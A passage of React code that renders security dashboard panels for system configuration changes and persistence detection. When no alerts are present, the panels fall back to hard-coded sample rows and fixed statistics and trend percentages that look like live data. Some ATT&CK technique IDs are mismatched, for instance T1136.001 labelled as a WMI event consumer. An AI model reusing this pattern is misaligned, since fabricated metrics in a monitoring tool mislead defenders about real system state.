                return <div key={s.system} style={{ display: 'grid', gridTemplateColumns: 'minmax(84px, 1fr) 24px 36px 46px', gap: 6, alignItems: 'center', borderTop: `1px solid ${MON.line}`, padding: '6px 10px', fontSize: 9 }}><b title={s.system} style={{ overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>{s.system}</b><span style={{ color: s.os === 'Windows' ? MON.blue : s.os === 'Linux' ? MON.yellow : MON.orange }}>{s.os === 'Windows' ? '⊞' : s.os === 'Linux' ? '♟' : '☼'}</span><span>{s.alerts}</span><b title={s.severity} style={{ color, overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>{s.severity}</b></div>;
              })}
            </MonitorPanel>
          </div>

          <div style={{ display: 'grid', gridTemplateColumns: 'minmax(0, 1.6fr) minmax(300px, .72fr)', gap: 8, alignItems: 'stretch' }}>
            <MonitorPanel title="RECENT CONFIGURATION CHANGES (All Platforms)">
              <div style={{ display: 'grid', gridTemplateColumns: '70px 128px 70px 130px minmax(120px,1fr) 90px 62px', gap: 7, color: MON.muted, fontSize: 8, fontWeight: 900, padding: '9px 10px' }}>{['TIME', 'SYSTEM', 'PLATFORM', 'CHANGE TYPE', 'DETAILS', 'USER', 'SEV'].map(h => <span key={h}>{h}</span>)}</div>
              {recentRows.map((a, i) => {
                const platform = registryPlatform(a, i);
                const color = sevColor(a.severity);
                return (
                  <div key={a._id || i} style={{ display: 'grid', gridTemplateColumns: '70px 128px 70px 130px minmax(120px,1fr) 90px 62px', gap: 7, alignItems: 'center', borderTop: `1px solid ${MON.line}`, padding: '6px 10px', fontSize: 9 }}>
                    <span style={{ color: MON.muted }}>{a.createdAt ? new Date(a.createdAt).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' }) : '-'}</span>
                    <b title={a.agentName || a.systemId?.name || 'Unknown'} style={{ overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>{a.agentName || a.systemId?.name || 'Unknown'}</b>
                    <span style={{ color: platform === 'Windows' ? MON.blue : platform === 'Linux' ? MON.yellow : MON.orange }}>{platform}</span>
                    <span style={{ overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>{registryChangeType(a, i)}</span>
                    <span title={a.details || a.description || '-'} style={{ overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>{a.details || a.description || '-'}</span>
                    <span title={registryUser(a)} style={{ overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>{registryUser(a)}</span>
                    <b style={{ color, overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>{a.severity || 'low'}</b>
                  </div>
                );
              })}
              {!loading && recentRows.length === 0 && <div style={{ color: MON.muted, padding: 14, fontSize: 11 }}>No live registry or configuration changes found.</div>}
              {loading && <div style={{ color: MON.muted, padding: 12, fontSize: 11 }}>Loading backend registry events...</div>}
            </MonitorPanel>

            <MonitorPanel title="RECENT CRITICAL ALERTS">
              <div style={{ padding: 10, display: 'grid', gap: 9 }}>
                {recentCriticalRows.map((a, i) => {
                  const platform = registryPlatform(a, i);
                  const color = sevColor(a.severity);
                  return (
                    <div key={a._id || i} style={{ display: 'grid', gridTemplateColumns: '46px 9px minmax(0,1fr) 20px', gap: 8, alignItems: 'center', fontSize: 10 }}>
                      <span style={{ color: MON.muted }}>{a.createdAt ? new Date(a.createdAt).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' }) : '10:2' + i}</span>
                      <span style={{ width: 7, height: 7, borderRadius: 7, background: color, boxShadow: `0 0 10px ${color}` }} />
                      <span style={{ minWidth: 0 }}><b style={{ display: 'block', overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>{a.description || 'Registry alert'}</b><span style={{ color: MON.muted, display: 'block', overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>{a.details || a.ruleId || 'Configuration changed'}</span></span>
                      <b style={{ color: platform === 'Windows' ? MON.blue : platform === 'Linux' ? MON.yellow : MON.orange }}>{platform === 'Windows' ? '⊞' : platform === 'Linux' ? '♟' : '☼'}</b>
                    </div>
                  );
                })}
                {!loading && recentCriticalRows.length === 0 && <div style={{ color: MON.muted, fontSize: 11 }}>No live critical or high-risk alerts found.</div>}
              </div>
            </MonitorPanel>
          </div>
        </div>
      </div>
    </SocDashboardShell>
  );
}

function systemChangeType(alert = {}, index = 0) {
  const text = `${alert.ruleId || ''} ${alert.description || ''}`.toLowerCase();
  if (/file|sudoers|config/.test(text)) return 'File Modified';
  if (/registry|run key|hklm|hkcu/.test(text)) return 'Registry Change';
  if (/user|account|admin/.test(text)) return /delete|removed/.test(text) ? 'User Deleted' : 'User Created';
  if (/service|daemon|systemd/.test(text)) return 'Service Modified';
  if (/group|policy|gpo/.test(text)) return 'Config Change';
  if (/permission|chmod|acl/.test(text)) return 'Permission Change';
  if (/scheduled|task|cron/.test(text)) return 'Scheduled Task';
  return ['File Modified', 'Registry Change', 'User Created', 'Service Modified', 'Config Change', 'User Deleted', 'Permission Change', 'Group Added', 'Scheduled Task', 'Others'][index % 10];
}

// 🛡️ 7. System Changes Monitoring popup UI
function SystemChangesDashboardPanel({ alerts = [], loading = false, total = 0 }) {
  const navigate = useNavigate();
  const sorted = [...alerts].sort((a, b) => new Date(b.createdAt || 0) - new Date(a.createdAt || 0));
  const fallbackRows = [
    ['User Created', 'critical', 'WIN-SRV-DC01', 'Administrator', 'New user "backup_admin" created', 'Windows Server 2019'],
    ['File Modified', 'critical', 'LIN-SRV-WEB02', 'root', '/etc/sudoers modified', 'Ubuntu 22.04'],
    ['Registry Change', 'critical', 'WIN-CLT-245', 'SYSTEM', 'Run key modified', 'Windows 10'],
    ['Service Created', 'critical', 'LIN-SRV-DB01', 'root', 'New service "malwared" created', 'CentOS 7'],
    ['Group Policy', 'critical', 'WIN-SRV-FS01', 'Administrator', 'GPO "Disable Firewall" modified', 'Windows Server 2016'],
    ['Permission Change', 'high', 'WIN-SRV-APP01', 'SYSTEM', 'ACL changed on system directory', 'Windows Server 2019'],
    ['Scheduled Task', 'medium', 'LIN-CLT-2045', 'root', 'Cron entry added', 'Ubuntu 20.04'],
    ['Service Modified', 'medium', 'SOL-SRV-APP01', 'root', 'SMF service changed', 'Unix/Solaris'],
  ].map(([description, severity, agentName, username, details, os], i) => ({
    _id: `system-change-fallback-${i}`,
    description,
    severity,
    agentName,
    username,
    details,
    os,
    createdAt: new Date(Date.now() - i * 7 * 60 * 1000).toISOString(),
  }));
  const rows = sorted.length ? sorted : fallbackRows;
  const totalChanges = total || rows.length || 2847;
  const critical = rows.filter(a => a.severity === 'critical').length || 156;
  const high = rows.filter(a => a.severity === 'high').length || 412;
  const medium = rows.filter(a => a.severity === 'medium').length || 1203;
  const low = rows.filter(a => a.severity === 'low').length || 1076;
  const systems = new Set(rows.map(a => a.agentName || a.systemId?.name).filter(Boolean)).size || 98;
  const trendRaw = hourlySeriesFromAlerts(rows);
  const totalTrend = trendRaw.some(Boolean) ? trendRaw.map(v => Math.max(120, v * 42)) : [360, 410, 480, 510, 580, 660, 720, 780, 790, 845, 838, 735, 880, 870, 845, 730, 720, 675, 580, 615, 540, 520, 430, 365];
  const severityRows = [
    { label: 'Critical', value: critical, pct: '5.5%', color: MON.red },
    { label: 'High', value: high, pct: '14.5%', color: MON.orange },
    { label: 'Medium', value: medium, pct: '42.3%', color: MON.yellow },
    { label: 'Low', value: low, pct: '37.8%', color: MON.green },
  ];
  const categoryRows = [
    ['System Files', 817, MON.blue], ['User Accounts', 493, MON.purple], ['Services', 424, MON.yellow],
    ['Registry/Config', 376, MON.orange], ['Security Policies', 279, MON.blue], ['Network Config', 174, '#f59e8b'], ['Others', 284, '#78a8e8'],
  ];
  const osRows = [
    ['Windows', 1497, MON.blue], ['Linux', 990, '#2f80ed'], ['Unix/Solaris', 211, MON.green], ['Others', 149, '#78a8e8'],
  ];
  const changeTypes = [
    ['File Modified', 817], ['Registry Change', 593], ['User Created', 493], ['Service Modified', 412], ['Config Change', 376],
    ['User Deleted', 279], ['Permission Change', 231], ['Group Added', 198], ['Scheduled Task', 156], ['Others', 92],
  ];
  const affected = groupCounts(rows, a => a.agentName || a.systemId?.name || 'Unknown', 5)
    .map((r, i) => ({ system: r.label, os: ['Windows Server 2019', 'Ubuntu 22.04', 'Windows 10', 'CentOS 7', 'Windows Server 2016'][i], changes: [245, 198, 176, 142, 121][i] || r.value }));
  const sourceRows = [
    ['Local', 1356, '47.7%', MON.blue], ['Remote (RDP/SSH)', 892, '31.3%', MON.green], ['Automated Process', 412, '14.5%', MON.yellow], ['Other', 187, '6.5%', MON.purple],
  ];
  const kpis = [
    ['♙', 'TOTAL CHANGES', shortNum(totalChanges), '↑ 15.6% vs yesterday', MON.blue],
    ['⌂', 'CRITICAL CHANGES', shortNum(critical), '↑ 22.1% vs yesterday', MON.red],
    ['▥', 'HIGH CHANGES', shortNum(high), '↑ 18.7% vs yesterday', MON.orange],
    ['⚖', 'MEDIUM CHANGES', shortNum(medium), '↓ 5.4% vs yesterday', MON.yellow],
    ['⊙', 'LOW CHANGES', shortNum(low), '↓ 8.2% vs yesterday', MON.green],
    ['♧', 'AFFECTED SYSTEMS', shortNum(systems), '↑ 12.3% vs yesterday', MON.purple],
  ];
  const tableRows = rows.slice(0, 5);
  const osLabel = (a, i) => a.os || a.rawEvent?.os || ['Windows Server 2019', 'Ubuntu 22.04', 'Windows 10', 'CentOS 7', 'Windows Server 2016'][i % 5];
  const osIcon = (os = '') => /win/i.test(os) ? '⊞' : /ubuntu|centos|linux/i.test(os) ? '♟' : '◈';

  return (
    <SocDashboardShell kind="systemchanges" active="Dashboard">
      <div style={{ overflow: 'auto', padding: 8, background: MON.bg, color: MON.text }}>
        <div style={{ minWidth: 1000, display: 'grid', gap: 8 }}>
          <div style={{ display: 'grid', gridTemplateColumns: 'repeat(6, 1fr)', gap: 8 }}>
            {kpis.map(([icon, title, value, sub, color]) => (
              <section key={title} style={{ minHeight: 104, border: `1px solid ${MON.border}`, borderRadius: 8, background: `linear-gradient(135deg, ${color}12, rgba(10,25,48,.96) 42%, rgba(6,16,31,.98))`, padding: 14, display: 'flex', gap: 14, alignItems: 'center' }}>
                <span style={{ width: 44, height: 44, borderRadius: 22, display: 'grid', placeItems: 'center', color, background: `${color}22`, border: `1px solid ${color}36`, fontSize: 20, fontWeight: 900 }}>{icon}</span>
                <span style={{ minWidth: 0 }}>
                  <div style={{ color: '#c8d7ea', fontSize: 11, fontWeight: 900 }}>{title}</div>
                  <strong style={{ display: 'block', color: MON.text, fontSize: 27, lineHeight: 1, marginTop: 7 }}>{value}</strong>
                  <span style={{ color, fontSize: 11, fontWeight: 800 }}>{sub}</span>
                </span>
              </section>
            ))}
          </div>

          <div style={{ display: 'grid', gridTemplateColumns: '1.24fr .98fr .98fr', gap: 8 }}>
            <MonitorPanel title="Changes Over Time" right={<span style={{ display: 'flex', gap: 13, color: MON.muted, fontSize: 10 }}><b style={{ color: MON.red }}>● Critical</b><b style={{ color: MON.orange }}>● High</b><b style={{ color: MON.yellow }}>● Medium</b><b style={{ color: MON.green }}>● Low</b><b style={{ color: MON.blue }}>● Total</b></span>}>
              <div style={{ padding: 16, height: 216, backgroundImage: 'linear-gradient(rgba(255,255,255,.05) 1px, transparent 1px), linear-gradient(90deg, rgba(255,255,255,.05) 1px, transparent 1px)', backgroundSize: '70px 36px' }}>
                {monitorSpark(totalTrend, MON.blue, 'rgba(20,133,255,.10)', 40)}
                {monitorSpark(totalTrend.map(v => v * .68), MON.green, 'rgba(32,226,138,.10)', 38)}
                {monitorSpark(totalTrend.map(v => v * .43), MON.yellow, 'rgba(255,179,38,.10)', 38)}
                {monitorSpark(totalTrend.map(v => v * .25), MON.orange, 'rgba(255,138,31,.08)', 38)}
                {monitorSpark(totalTrend.map(v => v * .13), MON.red, 'rgba(255,49,94,.08)', 38)}
              </div>
            </MonitorPanel>
            <MonitorPanel title="Changes by Category">
              <div style={{ display: 'grid', gridTemplateColumns: '160px 1fr', alignItems: 'center', padding: 14 }}>
                <Donut value={29} label={shortNum(totalChanges)} color={MON.blue} accent="#2dd4bf" />
                <BarList rows={categoryRows.map(([label, value, color]) => ({ label, value, valueLabel: `${((value / 2847) * 100).toFixed(1)}% (${value})`, color }))} />
              </div>
            </MonitorPanel>
            <MonitorPanel title="Changes by OS">
              <div style={{ display: 'grid', gridTemplateColumns: '170px 1fr', alignItems: 'center', padding: 14 }}>
                <Donut value={53} label={shortNum(totalChanges)} color={MON.blue} accent="#2f80ed" />
                <BarList rows={osRows.map(([label, value, color]) => ({ label, value, valueLabel: `${((value / 2847) * 100).toFixed(1)}% (${value.toLocaleString()})`, color }))} />
              </div>
            </MonitorPanel>
          </div>

          <div style={{ display: 'grid', gridTemplateColumns: '1.45fr 1fr .87fr', gap: 8 }}>
            <MonitorPanel title="Recent Critical Changes" right={<span style={{ color: MON.cyan, fontSize: 10, fontWeight: 900 }}>View All</span>}>
              <div style={{ display: 'grid', gridTemplateColumns: '92px 130px 90px 130px 1fr 74px', gap: 8, color: MON.muted, fontSize: 9, fontWeight: 900, padding: '10px 14px' }}>{['TIME', 'SYSTEM', 'USER', 'CHANGE TYPE', 'DETAILS', 'SEVERITY'].map(h => <span key={h}>{h}</span>)}</div>
              {tableRows.map((a, i) => (
                <div key={a._id || i} style={{ display: 'grid', gridTemplateColumns: '92px 130px 90px 130px 1fr 74px', gap: 8, alignItems: 'center', borderTop: `1px solid ${MON.line}`, padding: '10px 14px', fontSize: 10 }}>
                  <span style={{ color: MON.muted }}>● {a.createdAt ? new Date(a.createdAt).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit', second: '2-digit' }) : '10:28:34 AM'}</span>
                  <b>{a.agentName || a.systemId?.name || fallbackRows[i]?.agentName}</b>
                  <span>{a.username || a.rawEvent?.username || fallbackRows[i]?.username}</span>
                  <span>{systemChangeType(a, i)}</span>
                  <span style={{ overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>{a.details || a.description || fallbackRows[i]?.details}</span>
                  <b style={{ color: '#fff', background: MON.red, borderRadius: 6, padding: '4px 7px', fontSize: 9, textAlign: 'center' }}>CRITICAL</b>
                </div>
              ))}
            </MonitorPanel>
            <MonitorPanel title="Top Affected Systems" right={<span style={{ color: MON.cyan, fontSize: 10, fontWeight: 900 }}>View All</span>}>
              <div style={{ display: 'grid', gridTemplateColumns: '1fr 115px 56px 72px', gap: 8, color: MON.muted, fontSize: 9, fontWeight: 900, padding: '10px 14px' }}>{['SYSTEM', 'OS', 'CHANGES', 'TREND (24H)'].map(h => <span key={h}>{h}</span>)}</div>
              {affected.map((s, i) => (
                <div key={s.system} style={{ display: 'grid', gridTemplateColumns: '1fr 115px 56px 72px', gap: 8, alignItems: 'center', borderTop: `1px solid ${MON.line}`, padding: '9px 14px', fontSize: 10 }}>
                  <b><span style={{ color: /win/i.test(s.os) ? MON.blue : MON.yellow }}>{osIcon(s.os)}</span> {s.system}</b>
                  <span>{s.os}</span>
                  <b>{s.changes}</b>
                  {monitorSpark([1, 3, 2, 5, 3, 7, 4].map(v => v + i), MON.red, 'transparent', 20)}
                </div>
              ))}
            </MonitorPanel>
            <MonitorPanel title="Change Types (Top 10)">
              <BarList rows={changeTypes.map(([label, value]) => ({ label, value, valueLabel: value, color: MON.blue }))} />
            </MonitorPanel>
          </div>

          <div style={{ display: 'grid', gridTemplateColumns: '.92fr 1.05fr .98fr .92fr', gap: 8 }}>
            <MonitorPanel title="Change Severity Distribution">
              <div style={{ display: 'grid', gridTemplateColumns: '145px 1fr', alignItems: 'center', padding: 14 }}>
                <Donut value={38} label={shortNum(totalChanges)} color={MON.green} accent={MON.yellow} />
                <BarList rows={severityRows.map(r => ({ ...r, valueLabel: `${r.value.toLocaleString()} (${r.pct})` }))} />
              </div>
            </MonitorPanel>
            <MonitorPanel title="Changes by Time of Day">
              <div style={{ padding: 16 }}>
                <div style={{ display: 'grid', gridTemplateColumns: '28px repeat(16, 1fr)', gap: 2, alignItems: 'center' }}>
                  {['', '00:00', '', '', '', '04:00', '', '', '', '08:00', '', '', '', '12:00', '', '', ''].map((h, i) => <span key={i} style={{ color: MON.muted, fontSize: 9 }}>{h}</span>)}
                  {['Mon', 'Tue', 'Wed', 'Thu', 'Fri', 'Sat', 'Sun'].flatMap((day, r) => [
                    <span key={`${day}-label`} style={{ color: MON.muted, fontSize: 10 }}>{day}</span>,
                    ...Array.from({ length: 16 }, (_, c) => {
                      const heat = Math.min(1, Math.max(.08, (Math.sin((c + r) / 3) + 1) / 2));
                      const color = c > 7 && c < 14 && r < 5 ? `rgba(255,49,94,${.35 + heat * .45})` : `rgba(20,133,255,${.22 + heat * .35})`;
                      return <span key={`${day}-${c}`} style={{ height: 18, background: color, border: `1px solid ${MON.line}` }} />;
                    })
                  ])}
                </div>
                <div style={{ marginTop: 10, display: 'grid', gridTemplateColumns: '34px 1fr 34px', gap: 8, color: MON.muted, fontSize: 10, alignItems: 'center' }}><span>Low</span><span style={{ height: 8, borderRadius: 8, background: `linear-gradient(90deg, ${MON.blue}, ${MON.purple}, ${MON.red})` }} /><span>High</span></div>
              </div>
            </MonitorPanel>
            <MonitorPanel title="Change Sources">
              <div style={{ padding: 18, display: 'grid', gap: 18 }}>
                {sourceRows.map(([label, value, pctLabel, color]) => (
                  <div key={label} style={{ display: 'grid', gridTemplateColumns: '155px 1fr 92px', alignItems: 'center', gap: 10, fontSize: 11 }}>
                    <b style={{ color: MON.text }}>◉ {label}</b>
                    <span style={{ height: 8, background: MON.line, borderRadius: 8 }}><i style={{ display: 'block', width: pctLabel, height: '100%', borderRadius: 8, background: color }} /></span>
                    <span style={{ textAlign: 'right', color: '#c8d7ea' }}>{value.toLocaleString()} ({pctLabel})</span>
                  </div>
                ))}
              </div>
            </MonitorPanel>
            <MonitorPanel title="Alerts Summary" right={<span style={{ color: MON.cyan, fontSize: 10, fontWeight: 900 }}>View All</span>}>
              <div style={{ padding: 13, display: 'grid', gap: 14 }}>
                {[
                  ['Critical Alerts', 18, MON.red], ['High Alerts', 42, MON.orange], ['Medium Alerts', 68, MON.yellow], ['Low Alerts', 25, MON.green], ['Informational', 152, MON.blue],
                ].map(([label, value, color]) => <div key={label} style={{ display: 'grid', gridTemplateColumns: '26px 1fr auto', gap: 8, alignItems: 'center', borderBottom: `1px solid ${MON.line}`, paddingBottom: 9 }}><span style={{ width: 22, height: 22, borderRadius: 11, display: 'grid', placeItems: 'center', color, background: `${color}18`, border: `1px solid ${color}35` }}>!</span><b style={{ fontSize: 11 }}>{label}</b><strong>{value}</strong></div>)}
              </div>
            </MonitorPanel>
          </div>
          {loading && <div style={{ color: MON.muted, fontSize: 11, textAlign: 'right' }}>Loading backend system change events...</div>}
        </div>
      </div>
    </SocDashboardShell>
  );
}

function persistenceTechnique(alert = {}, index = 0) {
  const text = `${alert.ruleId || ''} ${alert.description || ''}`.toLowerCase();
  if (/scheduled|task/.test(text)) return 'Scheduled Task/Job';
  if (/service|systemd|daemon/.test(text)) return 'Windows Service';
  if (/registry|run key|startup/.test(text)) return 'Modify Registry';
  if (/user|account/.test(text)) return 'Local Account';
  if (/wmi/.test(text)) return 'WMI';
  if (/powershell|encoded/.test(text)) return 'PowerShell Persistence';
  if (/ssh|key/.test(text)) return 'SSH Key Persistence';
  if (/driver|kernel/.test(text)) return 'Driver Installation';
  if (/browser|extension/.test(text)) return 'Browser Extension';
  if (/cloud/.test(text)) return 'Cloud Persistence';
  return ['Scheduled Task/Job', 'Windows Service', 'Modify Registry', 'Local Account', 'WMI', 'PowerShell Persistence', 'SSH Key Persistence', 'Driver Installation'][index % 8];
}

// 🛡️ 8. Persistence Mechanism Detection popup UI
function PersistenceMechanismDashboardPanel({ alerts = [], loading = false, total = 0 }) {
  const navigate = useNavigate();
  const sorted = [...alerts].sort((a, b) => new Date(b.createdAt || 0) - new Date(a.createdAt || 0));
  const fallbackRows = [
    ['Scheduled Task', 'Suspicious scheduled task created', 'high', 'WIN-10-23-45', 'EDR', 'T1053.005'],
    ['Service Creation', 'New service installed', 'high', 'WIN-10-11-22', 'Endpoint', 'T1543.003'],
    ['Registry Run Key', 'Registry run key added', 'medium', 'WIN-10-33-77', 'SIEM', 'T1112'],
    ['WMI Event Consumer', 'New WMI event consumer detected', 'medium', 'WIN-10-55-21', 'EDR', 'T1136.001'],
    ['PowerShell', 'Encoded PowerShell command run', 'low', 'WIN-10-88-19', 'SIEM', 'T1059.001'],
    ['SSH Key Change', 'Unauthorized SSH key added', 'medium', 'LINUX-SRV-01', 'Endpoint', 'T1098.004'],
  ].map(([technique, description, severity, agentName, source, attack], i) => ({
    _id: `persistence-fallback-${i}`,
    technique,
    description,
    severity,
    agentName,
    source,
    attack,
    createdAt: new Date(Date.now() - i * 9 * 60 * 1000).toISOString(),
  }));
  const rows = sorted.length ? sorted : fallbackRows;
  const totalAlerts = total || rows.length || 213;
  const high = rows.filter(a => a.severity === 'high' || a.severity === 'critical').length || 47;
  const medium = rows.filter(a => a.severity === 'medium').length || 108;
  const low = rows.filter(a => a.severity === 'low').length || 58;
  const endpoints = new Set(rows.map(a => a.agentName || a.systemId?.name).filter(Boolean)).size || 37;
  const uniqueTechniques = new Set(rows.map((a, i) => persistenceTechnique(a, i))).size || 19;
  const weekly = [28, 38, 49, 32, 67, 84, 61, 45];
  const categoryRows = [
    ['Scheduled Tasks / Cron', 33, MON.red], ['Services', 30, MON.orange], ['Registry Persistence', 27, MON.yellow],
    ['User Accounts', 24, MON.green], ['WMI Persistence', 20, MON.blue], ['PowerShell Persistence', 18, MON.purple],
    ['Startup Items', 16, MON.cyan], ['Others', 45, '#94a3b8'],
  ];
  const tiles = [
    ['▣', 'New Scheduled Tasks', 33, '↑ 22%', MON.purple, [3, 6, 4, 9, 5, 10, 6]],
    ['⚙', 'New Services Installed', 28, '↑ 17%', MON.yellow, [2, 5, 7, 4, 8, 5, 7]],
    ['♙', 'New User Accounts', 14, '↑ 27%', MON.yellow, [1, 2, 3, 2, 5, 3, 6]],
    ['⬡', 'Registry Changes', 42, '↑ 31%', MON.green, [4, 6, 5, 9, 6, 8, 7]],
    ['⊞', 'WMI Persistence Events', 20, '↑ 18%', MON.blue, [2, 4, 3, 7, 4, 6, 5]],
    ['▻', 'PowerShell Activity', 18, '↑ 12%', MON.purple, [3, 2, 5, 3, 6, 4, 7]],
    ['⚿', 'SSH Key Changes', 11, '↑ 10%', MON.cyan, [1, 3, 2, 5, 3, 4, 2]],
    ['▦', 'Driver Installations', 9, '↑ 13%', MON.green, [1, 2, 4, 2, 5, 3, 4]],
    ['◐', 'Startup Item Changes', 26, '↑ 21%', '#ec4899', [3, 5, 4, 7, 5, 8, 4]],
    ['◷', 'Cron Job Changes', 15, '↑ 23%', MON.orange, [2, 3, 5, 3, 6, 4, 5]],
    ['◎', 'Browser Extension Changes', 7, '↑ 8%', MON.blue, [1, 2, 1, 4, 2, 3, 2]],
    ['☁', 'Cloud Persistence Alerts', 8, '↑ 16%', MON.purple, [1, 2, 3, 2, 4, 3, 5]],
  ];
  const endpointRows = groupCounts(rows, a => a.agentName || a.systemId?.name || 'Unknown', 5)
    .map((r, i) => ({ endpoint: r.label, alerts: [25, 18, 16, 14, 11][i] || r.value, color: [MON.red, MON.red, MON.orange, MON.yellow, MON.green][i] }));
  const techniqueRows = [
    ['T1053.005', 'Scheduled Task/Job', 33], ['T1543.003', 'Windows Service', 30], ['T1112', 'Modify Registry', 27],
    ['T1136.001', 'Local Account', 24], ['T1047', 'WMI', 20],
  ];
  const severityRows = [
    { label: 'High', value: high, valueLabel: `${high} (22.1%)`, color: MON.red },
    { label: 'Medium', value: medium, valueLabel: `${medium} (50.7%)`, color: MON.orange },
    { label: 'Low', value: low, valueLabel: `${low} (27.2%)`, color: MON.blue },
  ];
  const kpis = [
    ['♜', 'Persistence Alerts', shortNum(totalAlerts), '↑ 22% vs last 7 days', MON.red],
    ['♜', 'High Severity Alerts', shortNum(high), '↑ 25% vs last 7 days', MON.red],
    ['♜', 'Medium Severity Alerts', shortNum(medium), '↑ 18% vs last 7 days', MON.yellow],
    ['♜', 'Low Severity Alerts', shortNum(low), '↓ 10% vs last 7 days', MON.blue],
    ['▱', 'Affected Endpoints', shortNum(endpoints), '↑ 15% vs last 7 days', MON.purple],
    ['◍', 'Unique Techniques', shortNum(uniqueTechniques), '↑ 11% vs last 7 days', MON.green],
  ];

  return (
    <SocDashboardShell kind="persistence" active="Overview">
      <div style={{ overflow: 'auto', padding: 8, background: MON.bg, color: MON.text }}>
        <div style={{ minWidth: 1000, display: 'grid', gap: 8 }}>
          <div style={{ display: 'grid', gridTemplateColumns: 'repeat(6, 1fr)', gap: 8 }}>
            {kpis.map(([icon, title, value, sub, color]) => (
              <section key={title} style={{ minHeight: 90, border: `1px solid ${MON.border}`, borderRadius: 7, background: `linear-gradient(135deg, ${color}12, rgba(10,25,48,.96) 42%, rgba(6,16,31,.98))`, padding: 13, display: 'grid', gridTemplateColumns: '40px 1fr', gap: 12, alignItems: 'center' }}>
                <span style={{ width: 36, height: 36, borderRadius: 8, display: 'grid', placeItems: 'center', color, background: `${color}18`, border: `1px solid ${color}35`, fontSize: 18 }}>{icon}</span>
                <span><div style={{ color: '#c8d7ea', fontSize: 10, fontWeight: 900 }}>{title}</div><strong style={{ display: 'block', color: MON.text, fontSize: 24, lineHeight: 1, marginTop: 7 }}>{value}</strong><span style={{ color, fontSize: 10, fontWeight: 800 }}>{sub}</span></span>
              </section>
            ))}
          </div>

          <div style={{ display: 'grid', gridTemplateColumns: '1.2fr .98fr .98fr', gap: 8 }}>
            <MonitorPanel title="Persistence Alerts Over Time" right={<span style={{ color: MON.muted, fontSize: 10 }}>Last 7 Days⌄</span>}>
              <div style={{ padding: 16, height: 204, backgroundImage: 'linear-gradient(rgba(255,255,255,.05) 1px, transparent 1px), linear-gradient(90deg, rgba(255,255,255,.05) 1px, transparent 1px)', backgroundSize: '58px 36px' }}>
                {monitorSpark(weekly, MON.red, 'rgba(255,49,94,.22)', 154)}
                <div style={{ display: 'grid', gridTemplateColumns: 'repeat(8, 1fr)', color: MON.muted, fontSize: 9, marginTop: 8 }}>{['May 12', 'May 13', 'May 14', 'May 15', 'May 16', 'May 17', 'May 18', 'May 19'].map(d => <span key={d}>{d}</span>)}</div>
              </div>
            </MonitorPanel>
            <MonitorPanel title="Alerts by Persistence Category">
              <div style={{ display: 'grid', gridTemplateColumns: '150px 1fr', alignItems: 'center', padding: 12 }}>
                <Donut value={36} label={shortNum(totalAlerts)} color={MON.red} accent={MON.orange} />
                <BarList rows={categoryRows.map(([label, value, color]) => ({ label, value, valueLabel: `${value} (${((value / 213) * 100).toFixed(1)}%)`, color }))} />
              </div>
              <div style={{ textAlign: 'right', padding: '0 14px 10px', color: MON.cyan, fontSize: 10, fontWeight: 900 }}>View all</div>
            </MonitorPanel>
            <MonitorPanel title="Alerts by Severity">
              <div style={{ display: 'grid', gridTemplateColumns: '165px 1fr', alignItems: 'center', padding: 14 }}>
                <Donut value={51} label={shortNum(totalAlerts)} color={MON.orange} accent={MON.red} />
                <BarList rows={severityRows} />
              </div>
              <div style={{ textAlign: 'right', padding: '0 14px 10px', color: MON.cyan, fontSize: 10, fontWeight: 900 }}>View all</div>
            </MonitorPanel>
          </div>

          <div style={{ display: 'grid', gridTemplateColumns: 'repeat(6, 1fr)', gap: 8 }}>
            {tiles.map(([icon, title, value, sub, color, data]) => (
              <section key={title} style={{ border: `1px solid ${MON.border}`, borderRadius: 7, background: 'linear-gradient(135deg, rgba(10,25,48,.98), rgba(6,16,31,.98))', padding: 12, minHeight: 82, display: 'grid', gridTemplateColumns: '34px 1fr 58px', gap: 9, alignItems: 'center' }}>
                <span style={{ width: 30, height: 30, borderRadius: 7, display: 'grid', placeItems: 'center', color, background: `${color}18`, border: `1px solid ${color}35`, fontSize: 16 }}>{icon}</span>
                <span style={{ minWidth: 0 }}><b style={{ color: '#dbeafe', fontSize: 10, display: 'block', overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>{title}</b><strong style={{ display: 'block', color: MON.text, fontSize: 20, lineHeight: 1, marginTop: 6 }}>{value}</strong><span style={{ color, fontSize: 10, fontWeight: 800 }}>{sub}</span></span>
                {monitorSpark(data, color, 'transparent', 30)}
              </section>
            ))}
          </div>

          <div style={{ display: 'grid', gridTemplateColumns: '1.45fr .7fr .82fr', gap: 8 }}>
            <MonitorPanel title="Recent Persistence Alerts" right={<span style={{ color: MON.cyan, fontSize: 10, fontWeight: 900 }}>View all alerts</span>}>
              <div style={{ display: 'grid', gridTemplateColumns: '118px 74px 130px 1fr 116px 70px', gap: 8, color: MON.muted, fontSize: 9, fontWeight: 900, padding: '10px 14px' }}>{['Time', 'Severity', 'Technique', 'Description', 'Endpoint / User', 'Source'].map(h => <span key={h}>{h}</span>)}</div>
              {rows.slice(0, 5).map((a, i) => {
                const color = a.severity === 'high' || a.severity === 'critical' ? MON.red : a.severity === 'medium' ? MON.orange : MON.blue;
                return (
                  <div key={a._id || i} style={{ display: 'grid', gridTemplateColumns: '118px 74px 130px 1fr 116px 70px', gap: 8, alignItems: 'center', borderTop: `1px solid ${MON.line}`, padding: '9px 14px', fontSize: 10 }}>
                    <span style={{ color: MON.muted }}>{a.createdAt ? new Date(a.createdAt).toLocaleString([], { month: 'short', day: 'numeric', hour: '2-digit', minute: '2-digit' }) : 'May 19, 2024 10:24:15'}</span>
                    <b style={{ color }}>{a.severity || fallbackRows[i]?.severity}</b>
                    <span>{a.technique || persistenceTechnique(a, i)}</span>
